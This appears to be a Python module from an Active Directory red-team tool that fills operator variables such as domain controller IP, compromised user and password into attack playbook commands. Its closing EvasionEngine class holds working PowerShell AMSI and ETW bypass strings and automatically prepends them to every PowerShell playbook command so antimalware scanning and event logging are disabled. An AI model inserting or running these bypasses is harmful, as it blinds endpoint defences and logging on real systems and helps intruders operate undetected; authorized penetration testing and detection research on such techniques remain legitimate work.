#!/usr/bin/env python3
"""
tactical.py — Playbook variable interpolation engine.

Loads operator-supplied environment variables from a JSON file and replaces
placeholder tokens (like <DC_IP>, <DOMAIN_USER>) in playbook commands,
attack path steps, and recommendations so they are immediately copy-paste ready.

Usage:
    interpolator = PlaybookInterpolator("vars.json")
    findings = interpolator.interpolate_findings(findings)
    paths = interpolator.interpolate_paths(paths)
    recs = interpolator.interpolate_recommendations(recs)
"""

from __future__ import annotations

import json
import re
from typing import Any, Dict, List, Optional


# VARIABLE MAPPING — maps JSON keys to placeholder tokens
# The operator's JSON uses user-friendly keys; placeholders in commands use
# the screaming-case format like <DC_IP>. We support both direct matches
# and common aliases.
_KEY_ALIASES: Dict[str, List[str]] = {
    "DC_IP":            ["domain_controller", "dc_ip", "dc"],
    "DC_HOST":          ["dc_hostname", "dc_host", "dc_fqdn"],
    "DOMAIN":           ["domain", "domain_name"],
    "DOMAIN_USER":      ["compromised_user", "domain_user", "username", "user"],
    "PASSWORD":         ["compromised_password", "password", "pass"],
    "TARGET_USER":      ["target_user", "target"],
    "TARGET_HOST":      ["target_host", "target_computer", "target_ip"],
    "CONTROLLED_HOST":  ["controlled_computer", "controlled_host", "attacker_computer"],
    "ATTACKER_HOST":    ["attacker_host", "attacker_ip", "lhost"],
    "NEW_PASSWORD":     ["new_password", "newpass"],
    "DOMAIN_SID":       ["domain_sid", "sid"],
    "CA_NAME":          ["ca_name", "ca", "certificate_authority"],
    "TEMPLATE_NAME":    ["template_name", "cert_template"],
}


class PlaybookInterpolator:
    """
    Loads a JSON variables file and replaces <PLACEHOLDER> tokens in strings.

    Supports two modes:
      1. Direct key match: {"DC_IP": "10.10.10.10"} replaces <DC_IP>
      2. Alias resolution: {"domain_controller": "10.10.10.10"} also replaces <DC_IP>
    """

    def __init__(self, variables_path: Optional[str] = None) -> None:
        self._raw_vars: Dict[str, str] = {}
        self._resolved: Dict[str, str] = {}
        if variables_path:
            self.load(variables_path)

    def load(self, path: str) -> None:
        """Load and resolve variables from a JSON file."""
        try:
            with open(path, "r", encoding="utf-8") as f:
                self._raw_vars = json.load(f)
        except Exception as e:
            print(f"  [!] Failed to load variables file '{path}': {e}")
            return

        # Build resolved map: PLACEHOLDER_NAME → value
        # 1. Direct uppercase keys
        for key, val in self._raw_vars.items():
            self._resolved[key.upper()] = str(val)

        # 2. Resolve aliases
        for placeholder, aliases in _KEY_ALIASES.items():
            if placeholder in self._resolved:
                continue  # already set directly
            for alias in aliases:
                for key, val in self._raw_vars.items():
                    if key.lower() == alias.lower():
                        self._resolved[placeholder] = str(val)
                        break
                if placeholder in self._resolved:
                    break

    @property
    def variables(self) -> Dict[str, str]:
        """Return the resolved placeholder → value mapping."""
        return dict(self._resolved)

    @property
    def loaded(self) -> bool:
        return bool(self._resolved)

    def interpolate(self, text: str) -> str:
        """Replace all <PLACEHOLDER> tokens in a string with resolved values."""
        if not self._resolved or not text:
            return text

        pattern = re.compile(r"<([A-Z0-9_]+)>")

        def replacer(match: re.Match) -> str:
            key = match.group(1)
            return self._resolved.get(key, match.group(0))

        return pattern.sub(replacer, text)

    # Batch processors
    def interpolate_findings(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Interpolate all playbook commands inside findings."""
        for f in findings:
            if f.get("playbooks"):
                f["playbooks"] = [self.interpolate(cmd) for cmd in f["playbooks"]]
            if f.get("recommendation"):
                f["recommendation"] = self.interpolate(f["recommendation"])
        return findings

    def interpolate_paths(self, paths: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Interpolate all commands inside attack path steps."""
        for p in paths:
            if p.get("steps"):
                p["steps"] = [self.interpolate(step) for step in p["steps"]]
        return paths

    def interpolate_recommendations(self, recs: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Interpolate commands inside recommendations."""
        for r in recs:
            if r.get("command"):
                r["command"] = self.interpolate(r["command"])
            if r.get("alt_commands"):
                r["alt_commands"] = [self.interpolate(cmd) for cmd in r["alt_commands"]]
        return recs

# EVASION ENGINE
class EvasionEngine:
    """
    Injects AMSI and ETW bypass payloads into playbooks.
    """
    def __init__(self) -> None:
        self.amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        self.etw_bypass = "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([System.Diagnostics.Eventing.EventProvider],0)"
    
    def _is_powershell(self, cmd: str) -> bool:
        cmd_lower = cmd.lower()
        return any(x in cmd_lower for x in ["powershell", "invoke-", "get-", "set-", "add-", "new-", ".ps1"])

    def inject_cmd(self, cmd: str) -> str:
        if self._is_powershell(cmd) and not cmd.strip().startswith("#"):
            return f"{self.amsi_bypass}; {self.etw_bypass}; {cmd}"
        return cmd

    def inject_evasion(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        for f in findings:
            if f.get("playbooks"):
                f["playbooks"] = [self.inject_cmd(cmd) for cmd in f["playbooks"]]
        return findings

    def inject_evasion_recs(self, recs: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        for r in recs:
            if r.get("command"):
                r["command"] = self.inject_cmd(r["command"])
            if r.get("alt_commands"):
                r["alt_commands"] = [self.inject_cmd(cmd) for cmd in r["alt_commands"]]
        return recs
